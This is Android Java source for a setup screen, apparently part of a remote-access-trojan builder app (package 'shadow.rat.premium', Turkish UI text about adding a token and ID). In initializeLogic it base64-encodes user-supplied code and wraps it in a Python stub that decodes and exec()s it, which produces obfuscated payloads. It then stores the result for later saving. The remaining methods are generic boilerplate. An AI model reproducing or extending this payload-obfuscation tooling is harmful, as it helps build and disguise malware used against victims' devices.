package shadow.rat.premium;

import android.animation.*;
import android.app.*;
import android.app.Activity;
import android.content.*;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.*;
import android.graphics.*;
import android.graphics.drawable.*;
import android.media.*;
import android.net.*;
import android.net.Uri;
import android.os.*;
import android.os.Bundle;
import android.text.*;
import android.text.style.*;
import android.util.*;
import android.view.*;
import android.view.View;
import android.view.View.*;
import android.view.animation.*;
import android.webkit.*;
import android.widget.*;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.annotation.*;
import androidx.appcompat.app.AppCompatActivity;
import androidx.fragment.app.DialogFragment;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import com.google.android.material.loadingindicator.LoadingIndicator;
import com.google.firebase.FirebaseApp;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import java.io.*;
import java.io.InputStream;
import java.text.*;
import java.util.*;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.*;
import org.json.*;

public class KurulumActivity extends AppCompatActivity {
	
	private Timer _timer = new Timer();
	
	private String isim = "";
	private String kod = "";
	private String sifre = "";
	private String mainkod = "";
	private HashMap<String, Object> map1 = new HashMap<>();
	
	private ArrayList<HashMap<String, Object>> lm = new ArrayList<>();
	
	private LinearLayout linear1;
	private LoadingIndicator linear2;
	private LinearLayout linear3;
	private LinearLayout linear4;
	private LinearLayout linear5;
	private TextView textview1;
	private Button button1;
	
	private Intent i = new Intent();
	private TimerTask t;
	private SharedPreferences sp;
	
	@Override
	protected void onCreate(Bundle _savedInstanceState) {
		super.onCreate(_savedInstanceState);
		setContentView(R.layout.kurulum);
		initialize(_savedInstanceState);
		FirebaseApp.initializeApp(this);
		initializeLogic();
	}
	
	private void initialize(Bundle _savedInstanceState) {
		linear1 = findViewById(R.id.linear1);
		linear2 = findViewById(R.id.linear2);
		linear3 = findViewById(R.id.linear3);
		linear4 = findViewById(R.id.linear4);
		linear5 = findViewById(R.id.linear5);
		textview1 = findViewById(R.id.textview1);
		button1 = findViewById(R.id.button1);
		sp = getSharedPreferences("sp", Activity.MODE_PRIVATE);
		
		button1.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				map1 = new HashMap<>();
				map1.put("başlık", isim);
				map1.put("kod", mainkod);
				lm.add(map1);
				sp.edit().putString("data", new Gson().toJson(lm)).commit();
				SketchwareUtil.showMessage(getApplicationContext(), "Başarıyla Eklendi! ");
				i.setClass(getApplicationContext(), MenuActivity.class);
				startActivity(i);
				SketchwareUtil.showMessage(getApplicationContext(), "Üzerine Tıklayıp Depolamaya Kaydedebilirsiniz");
				finish();
			}
		});
	}
	
	private void initializeLogic() {
		button1.setVisibility(View.GONE);
		if (sp.getString("data", "").equals("")) {
			
		} else {
			lm = new Gson().fromJson(sp.getString("data", ""), new TypeToken<ArrayList<HashMap<String, Object>>>(){}.getType());
		}
		isim = getIntent().getStringExtra("isim");
		kod = getIntent().getStringExtra("kod");
		t = new TimerTask() {
			@Override
			public void run() {
				runOnUiThread(new Runnable() {
					@Override
					public void run() {
						textview1.setText("Token Ve İd Ekleniyor...");
					}
				});
			}
		};
		_timer.schedule(t, (int)(600));
		t = new TimerTask() {
			@Override
			public void run() {
				runOnUiThread(new Runnable() {
					@Override
					public void run() {
						textview1.setText("Kod Şifreleniyor...");
						sifre = _Encrypt_Base64(kod);
						mainkod = "import base64\n\n".concat("encoded = \"".concat(sifre.concat("\"\n\n".concat("code = base64.b64decode(encoded).decode(\"utf-8\")\n\n".concat("exec(code)")))));
						t = new TimerTask() {
							@Override
							public void run() {
								runOnUiThread(new Runnable() {
									@Override
									public void run() {
										textview1.setText("Başarıyla Tamamlandı.");
										button1.setVisibility(View.VISIBLE);
									}
								});
							}
						};
						_timer.schedule(t, (int)(1000));
					}
				});
			}
		};
		_timer.schedule(t, (int)(1000));
	}
	
	public String _Encrypt_Base64(final String _data) {
		byte[] encodedBytes = java.util.Base64.getEncoder().encode(_data.getBytes());
		return new String(encodedBytes);
	}
	
	
	@Deprecated
	public void showMessage(String _s) {
		Toast.makeText(getApplicationContext(), _s, Toast.LENGTH_SHORT).show();
	}
	
	@Deprecated
	public int getLocationX(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[0];
	}
	
	@Deprecated
	public int getLocationY(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[1];
	}
	
	@Deprecated
	public int getRandom(int _min, int _max) {
		Random random = new Random();
		return random.nextInt(_max - _min + 1) + _min;
	}
	
	@Deprecated
	public ArrayList<Double> getCheckedItemPositionsToArray(ListView _list) {
		ArrayList<Double> _result = new ArrayList<Double>();
		SparseBooleanArray _arr = _list.getCheckedItemPositions();
		for (int _iIdx = 0; _iIdx < _arr.size(); _iIdx++) {
			if (_arr.valueAt(_iIdx))
			_result.add((double)_arr.keyAt(_iIdx));
		}
		return _result;
	}
	
	@Deprecated
	public float getDip(int _input) {
		return TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, _input, getResources().getDisplayMetrics());
	}
	
	@Deprecated
	public int getDisplayWidthPixels() {
		return getResources().getDisplayMetrics().widthPixels;
	}
	
	@Deprecated
	public int getDisplayHeightPixels() {
		return getResources().getDisplayMetrics().heightPixels;
	}
}